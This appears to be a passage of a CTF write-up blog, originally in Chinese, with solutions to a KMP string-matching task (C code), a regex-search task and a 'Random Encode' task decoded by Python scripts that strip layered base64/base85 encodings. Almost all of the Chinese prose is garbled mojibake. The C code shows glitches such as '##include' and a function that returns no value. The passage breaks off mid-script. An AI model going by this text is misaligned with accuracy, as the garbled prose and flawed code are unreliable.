<p>é¦–å…ˆæˆ‘ä»¬è¦æ˜ç™½ï¼ŒåŸºäºå…ˆå†³æ¡ä»¶11è€Œè¨€ï¼Œæˆ‘ä»¬åœ¨é¢„å¤„ç†æ—¶åº”å½“è€ƒè™‘å½“<strong>æ¨¡å¼ä¸²</strong>çš„ç¬¬ iä½å¤±é…æ—¶ï¼Œåº”å½“è·³è½¬åˆ°å“ªé‡Œ.å› ä¸ºåœ¨æ–‡æœ¬ä¸²ä¸­ï¼Œä¹‹å‰åŒ¹é…è¿‡çš„æ‰€æœ‰å­—ç¬¦å·²ç»æ²¡æœ‰ç”¨äº†â€”â€”éƒ½æ˜¯åŒ¹é…å®Œæˆæˆ–è€…å·²ç»å¤±é…çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„ kmp æ•°ç»„ï¼ˆå³æ˜¯ç”¨äºç¡®å®šå¤±é…åå˜åŒ–ä½ç½®çš„æ•°ç»„ï¼Œä¸‹åŒï¼‰åº”å½“è®°å½•çš„æ˜¯ï¼š</p>
<p><strong>åœ¨æ¨¡å¼ä¸² str1 ä¸­ï¼Œå¯¹äºæ¯ä¸€ä½ str1[i],å®ƒçš„ kmp æ•°ç»„åº”å½“æ˜¯è®°å½•ä¸€ä¸ªä½ç½® j, j â‰¤ i å¹¶ä¸”æ»¡è¶³ str1[i]=str1[j] å¹¶ä¸”åœ¨ j != 1 æ—¶ç†åº”æ»¡è¶³ str1[1] è‡³ str1[j - 1] åˆ†åˆ«ä¸ str[i - j + 1] ~str1[i - 1] æŒ‰ä½ç›¸ç­‰</strong></p>
<p>ä¸Šè¿°å³ä¸ºç§»ä½æ³•åˆ™</p>
<p>3ã€ä»å‰ç¼€åç¼€æ¥è§£é‡Š <code>KMP</code> :</p>
<p>é¦–å…ˆè§£é‡Šå‰åç¼€(å› ä¸ºå¤ªç®€å•å°±ä¸è§£é‡Šäº† )ï¼š</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="err">ç»™å®šä¸²ï¼š</span><span class="n">ABCABA</span>
</span></span><span class="line"><span class="cl"><span class="err">å‰ç¼€ï¼š</span><span class="n">A</span><span class="p">,</span><span class="n">AB</span><span class="p">,</span><span class="n">ABC</span><span class="p">,</span><span class="n">ABCA</span><span class="p">,</span><span class="n">ABCAB</span><span class="p">,</span><span class="n">ABCABA</span>
</span></span><span class="line"><span class="cl"><span class="err">åç¼€ï¼š</span><span class="n">A</span><span class="p">,</span><span class="n">BA</span><span class="p">,</span><span class="n">ABA</span><span class="p">,</span><span class="n">CABA</span><span class="p">,</span><span class="n">BCABA</span><span class="p">,</span><span class="n">ABCABA</span>
</span></span></code></pre></div><p>å…¶å®åˆšæ‰çš„ç§»ä½æ³•åˆ™å°±æ˜¯å¯¹äºæ¨¡å¼ä¸²çš„æ¯ä¸ªå‰ç¼€è€Œè¨€ï¼Œç”¨ <code>kmp</code> æ•°ç»„è®°å½•åˆ°å®ƒä¸ºæ­¢çš„<strong>æ¨¡å¼ä¸²å‰ç¼€çš„çœŸå‰ç¼€å’ŒçœŸåç¼€æœ€å¤§ç›¸åŒçš„ä½ç½®</strong>ï¼ˆæ³¨æ„ï¼Œè¿™ä¸ªåœ°æ–¹æ²¡æœ‰å†™é”™ï¼Œæ˜¯çœŸçš„æœ‰åµŒå¥—ï¼‰ã€‚ç„¶è€Œè¿™ä¸ªåœ°æ–¹æˆ‘ä»¬è¦è€ƒè™‘â€œ<strong>æ¨¡å¼ä¸²å‰ç¼€</strong>çš„å‰ç¼€å’Œåç¼€æœ€å¤§ç›¸åŒçš„ä½ç½®â€åŸå› åœ¨äºï¼Œæˆ‘ä»¬éœ€è¦ç”¨åˆ° <code>kmp</code>æ•°ç»„æ¢ä½æ—¶ï¼Œå½“ä¸”ä»…å½“æœªå®Œå…¨åŒ¹é…ã€‚æ‰€ä»¥æˆ‘ä»¬çš„æ“ä½œåªæ˜¯é’ˆå¯¹æ¨¡å¼ä¸²çš„å‰ç¼€âˆ’âˆ’æ¯•ç«Ÿæ˜¯å¤±é…å‡½æ•°ï¼Œå¤±é…ä¹‹ååªæœ‰å¯èƒ½æ˜¯æŸä¸ªéƒ¨åˆ†å‰ç¼€éœ€è¦â€œå¿«é€Ÿç§»åŠ¨â€ã€‚æ‰€ä»¥è¿™å°±å¯ä»¥è§£é‡Š <code>KMP</code>ä¸­å‰åç¼€åº”ç”¨çš„ä¸€ä¸ªç‰¹ç‚¹ï¼š</p>
<p><code>KMP</code>ä¸­å‰åç¼€ä¸åŒ…æ‹¬æ¨¡å¼ä¸²æœ¬èº«,å³<strong>åªè€ƒè™‘çœŸå‰ç¼€å’ŒçœŸåç¼€</strong>,å› ä¸ºæ¨¡å¼ä¸²æœ¬èº«éœ€è¦æ•´ä½“è€ƒè™‘ï¼Œå½“ä¸”ä»…å½“åŒ¹é…å®Œæ•´ä¸ªä¸²ä¹‹åï¼›è€ŒåŒ¹é…å®Œæ•´ä¸ªä¸²ä¸å°±å®ŒæˆåŒ¹é…äº†å—&hellip;</p>
</blockquote>
<p>è¿™ä¸ªæˆ‘è§‰å¾—å¾ˆè¯¦ç»†äº†&hellip;é‚£æ€ä¹ˆæ ¹æ®<code>KMP</code>ç®—æ³•å†™ä»£ç å‘¢..? ( æˆ‘è§‰å¾—ç¼–ç¨‹é¢˜çš„WPæœ€éš¾å†™, è¿˜è¦å†™<code>TreeDistance</code>&hellip; )</p>
<p>å…ˆæŠŠä»£ç è´´å‡ºæ¥:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c++" data-lang="c++"><span class="line"><span class="cl"><span class="cp">##include &lt;stdio.h&gt;
</span></span></span><span class="line"><span class="cl"><span class="cp">##include &lt;string.h&gt;
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="kt">char</span> <span class="n">S</span><span class="p">[</span><span class="mi">1000000</span><span class="p">]</span><span class="o">=</span><span class="s">&#34;&#34;</span><span class="p">,</span><span class="n">T</span><span class="p">[</span><span class="mi">1000000</span><span class="p">]</span><span class="o">=</span><span class="s">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">next</span><span class="p">[</span><span class="mi">100000</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">Next</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="n">T</span><span class="p">,</span><span class="kt">int</span> <span class="o">*</span><span class="n">next</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="n">memset</span><span class="p">(</span><span class="n">next</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">strlen</span><span class="p">(</span><span class="n">T</span><span class="p">));</span>   <span class="c1">// åˆå§‹åŒ–åŠ¨æ€æ•°ç»„,å°†å…¶é•¿åº¦è®¾ç½®ä¸º0
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">int</span> <span class="n">size</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">T</span><span class="p">);</span>       <span class="c1">// æŠŠnextæ•°ç»„çš„é•¿åº¦æ‰©å±•åˆ°å’ŒTçš„é•¿åº¦ä¸€è‡´
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">next</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">strlen</span><span class="p">(</span><span class="n">T</span><span class="p">);</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="p">(</span><span class="n">j</span> <span class="o">&gt;</span> <span class="o">-</span><span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="n">T</span><span class="p">[</span><span class="n">j</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">!=</span> <span class="n">T</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">            <span class="n">j</span> <span class="o">=</span> <span class="n">next</span><span class="p">[</span><span class="n">j</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">T</span><span class="p">[</span><span class="n">j</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="n">T</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">            <span class="n">j</span><span class="o">++</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">next</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">j</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">KMP</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span> <span class="n">S</span><span class="p">,</span><span class="kt">char</span> <span class="o">*</span> <span class="n">T</span><span class="p">,</span><span class="kt">int</span> <span class="n">i</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">cnt</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>    <span class="c1">// countçš„ç¼©å†™
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">Next</span><span class="p">(</span><span class="n">T</span><span class="p">,</span> <span class="n">next</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">slen</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">S</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">tlen</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">T</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">slen</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="p">(</span><span class="n">j</span> <span class="o">&gt;</span> <span class="o">-</span><span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="n">T</span><span class="p">[</span><span class="n">j</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">!=</span> <span class="n">S</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">            <span class="n">j</span> <span class="o">=</span> <span class="n">next</span><span class="p">[</span><span class="n">j</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">T</span><span class="p">[</span><span class="n">j</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="n">S</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">            <span class="o">++</span><span class="n">j</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">j</span> <span class="o">==</span> <span class="n">tlen</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">printf</span><span class="p">(</span><span class="s">&#34;%d &#34;</span><span class="p">,</span><span class="n">i</span> <span class="o">-</span> <span class="n">tlen</span> <span class="o">+</span> <span class="mi">2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="o">++</span><span class="n">cnt</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="n">j</span> <span class="o">=</span> <span class="n">next</span><span class="p">[</span><span class="n">j</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%s&#34;</span><span class="p">,</span><span class="n">S</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%s&#34;</span><span class="p">,</span><span class="n">T</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">KMP</span><span class="p">(</span><span class="n">S</span><span class="p">,</span><span class="n">T</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="c1">//printf(&#34;%d &#34;,i);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="c1">//system(&#34;pause&#34;);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>woc&hellip; æˆ‘ä¸æƒ³å†™äº†&hellip; ä»£ç åŸç†å·²ç»æ”¾å‡ºæ¥äº†,, æ¥ä¸‹æ¥çš„çœ‹ä»£ç å§&hellip;</p>
<h3 id="perfect-repeater">Perfect Repeater</h3>
<p>å¦‚æœæˆ‘èƒ½åšå‡ºæ¥æˆ‘å†å†™&hellip; æˆ‘è¿˜åšä¸å‡ºæ¥</p>
<h3 id="frank-nb">Frank NB!</h3>
<p>æˆ‘å†™è¿™é“é¢˜çš„æ—¶å€™&hellip; å·®ç‚¹å°±å½“äº†å·¥å…·äºº&hellip; ä¸è¿‡è¿˜å¥½æœ‰å·¥å…·â€¦. Frank NB! Visual Studio Code NB!</p>
<p>ä¸‹è½½å®Œé¢˜ç›®ç»™çš„å‹ç¼©åŒ…, ç„¶åè§£å‹, ç„¶åè¿›å…¥æ–‡ä»¶å¤¹, ç„¶åå³é”®åœ¨ V S Code ä¸­æ‰“å¼€, ç„¶åç‚¹å‡»å·¦ä¾§çš„æ”¾å¤§é•œ, ç„¶åè¾“å…¥ <code>^[a-zA-Z][0-9]{3,5}[~!@#$%^&amp;*()_+][A-Za-z]{0,8}$</code>, ç„¶åå›è½¦æœç´¢â€¦</p>
<p>WD**Då’‹ä¸å¯¹å•Š..?!</p>
<p>å™¢å™¢è¿˜å¾—æ’é™¤ä¸€ä¸‹<code>FrankNB?</code>çš„æ–‡ä»¶&hellip;</p>
<p>å·¥å…·äººåŸºå› è§‰é†’!</p>
<p>æ‰‹åŠ¨åˆ æ‰äº†æ‰€æœ‰<code>FrankNB?</code>ä¹‹å, ç»ˆäºè·å–äº†æ­£ç¡®çš„æ•°, ç„¶å<code>SHA256</code>ç®—ä¸€éä¹‹åæ‹¿åˆ°<code>flag</code>â€¦</p>
<h3 id="random-encode">Random Encode</h3>
<p>è¿™é¢˜è¯»äº†è¯»ä»£ç , å‘ç°è¿˜çœŸå°±æ˜¯éšæœºåŠ å¯†&hellip;</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">random</span> <span class="kn">import</span> <span class="n">Random</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flag</span> <span class="kn">import</span> <span class="n">flag</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">Random</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">EncoderSet</span> <span class="o">=</span> <span class="p">[</span><span class="n">a85encode</span><span class="p">,</span><span class="n">b16encode</span><span class="p">,</span><span class="n">b32encode</span><span class="p">,</span><span class="n">b64encode</span><span class="p">,</span><span class="n">b85encode</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">randrange</span><span class="p">(</span><span class="mi">30</span><span class="p">,</span><span class="mi">35</span><span class="p">)):</span>
</span></span><span class="line"><span class="cl">    <span class="n">Encoder</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="n">EncoderSet</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">flag</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="n">EncoderSet</span><span class="p">)(</span><span class="nb">str</span><span class="p">(</span><span class="n">EncoderSet</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="n">Encoder</span><span class="p">))</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span> <span class="o">+</span> \
</span></span><span class="line"><span class="cl">            <span class="sa">b</span><span class="s1">&#39;w1ndNB&#39;</span> <span class="o">+</span> <span class="n">Encoder</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;secret.txt&#39;</span><span class="p">,</span><span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">out</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">out</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
</span></span></code></pre></div><p>å‘ç°è„šæœ¬åº”è¯¥æ˜¯æŠŠæ­£ç¡®çš„<code>flag</code>éšæœºé€‰åŠ å¯†æ–¹å¼åŠ å¯†äº†30å¤šå±‚, ç„¶åå°±äº§ç”Ÿäº†ä¸€ä¸ª40å¤šMBçš„å¤§å®¶ä¼™&hellip; æˆ‘å¿½ç„¶äº§ç”Ÿäº†ä¸€ä¸ªæƒ³æ³•, æ—¢ç„¶æœ‰éšæœºåŠ å¯†ç®—æ³•é€‰æ‹©çš„æç¤º, é‚£æˆ‘ä½•ä¸æŠŠæ¯ç§ç®—æ³•çš„æç¤ºå¤´éƒ½ç®—å‡ºæ¥, ç„¶åæ¯è§£å¯†ä¸€æ¬¡, å°±è¯»ä¸ªå¤´ç„¶åæŸ¥è¡¨, å¯¹åº”è§£å¯†å‘¢?</p>
<p>ç„¶åå°±æœ‰äº†ä¸€ä¸ªå°è„šæœ¬:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">random</span> <span class="kn">import</span> <span class="n">Random</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">Random</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">EncoderSet</span> <span class="o">=</span> <span class="p">[</span><span class="n">a85encode</span><span class="p">,</span><span class="n">b16encode</span><span class="p">,</span><span class="n">b32encode</span><span class="p">,</span><span class="n">b64encode</span><span class="p">,</span><span class="n">b85encode</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">EncoderSet</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="n">EncoderSet</span><span class="p">)(</span><span class="nb">str</span><span class="p">(</span><span class="n">EncoderSet</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="n">i</span><span class="p">))</span><span class="o">.</span><span class="n">encode</span><span class="p">()))</span>
</span></span></code></pre></div><p>ç„¶åè¿è¡Œè¿™ä¸ªè„šæœ¬Næ¬¡ä¹‹å, ç»Ÿè®¡å¾—å‡ºæ‰€æœ‰åŠ å¯†æ–¹å¼å¯èƒ½å‡ºç°çš„æ–‡ä»¶å¤´:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">a85</span> <span class="o">=</span> <span class="p">[</span><span class="sa">b</span><span class="s1">&#39;Fa&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;0E&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;MA==&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;30&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;GA======&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">b16</span> <span class="o">=</span> <span class="p">[</span><span class="sa">b</span><span class="s1">&#39;F#&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;0`&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;MQ==&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;31&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;GE======&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">b32</span> <span class="o">=</span> <span class="p">[</span><span class="sa">b</span><span class="s1">&#39;G5&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;1&amp;&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;Mg==&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;32&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;GI======&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">b64</span> <span class="o">=</span> <span class="p">[</span><span class="sa">b</span><span class="s1">&#39;GX&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;1B&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;Mw==&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;33&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;GM======&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">b85</span> <span class="o">=</span> <span class="p">[</span><span class="sa">b</span><span class="s1">&#39;Gy&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;1]&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;NA==&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;34&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;GQ======&#39;</span><span class="p">]</span>
</span></span></code></pre></div><p>ç„¶åå†™äº†ä¸ªè„šæœ¬:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">a85</span> <span class="o">=</span> <span class="p">[</span><span class="sa">b</span><span class="s1">&#39;Fa&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;0E&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;MA==&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;30&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;GA======&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">b16</span> <span class="o">=</span> <span class="p">[</span><span class="sa">b</span><span class="s1">&#39;F#&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;0`&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;MQ==&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;31&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;GE======&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">b32</span> <span class="o">=</span> <span class="p">[</span><span class="sa">b</span><span class="s1">&#39;G5&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;1&amp;&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;Mg==&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;32&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;GI======&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">b64</span> <span class="o">=</span> <span class="p">[</span><span class="sa">b</span><span class="s1">&#39;GX&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;1B&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;Mw==&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;33&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;GM======&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">b85</span> <span class="o">=</span> <span class="p">[</span><span class="sa">b</span><span class="s1">&#39;Gy&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;1]&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;NA==&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;34&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;GQ======&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">EncoderSet</span> <span class="o">=</span> <span class="p">[</span><span class="n">a85decode</span><span class="p">,</span> <span class="n">b16decode</span><span class="p">,</span> <span class="n">b32decode</span><span class="p">,</span> <span class="n">b64decode</span><span class="p">,</span> <span class="n">b85decode</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">point</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="n">point</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;.</span><span class="se">\\</span><span class="s1">secret.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">s</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">point</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span>
</span></span><span class="line"><span class="cl">    <span class="n">n</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;w1ndNB&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">s</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="n">n</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">    <span class="n">x</span> <span class="o">=</span> <span class="n">s</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="n">n</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">s</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="n">n</span><span class="p">]</span> <span class="ow">in</span> <span class="n">a85</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">point</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">s</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="n">n</span><span class="p">]</span> <span class="ow">in</span> <span class="n">b16</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">point</span> <span class="o">=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">s</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="n">n</span><span class="p">]</span> <span class="ow">in</span> <span class="n">b32</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">point</span> <span class="o">=</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">s</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="n">n</span><span class="p">]</span> <span class="ow">in</span> <span class="n">b64</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">point</span> <span class="o">=</span> <span class="mi">3</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">s</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="n">n</span><span class="p">]</span> <span class="ow">in</span> <span class="n">b85</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">point</span> <span class="o">=</span> <span class="mi">4</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
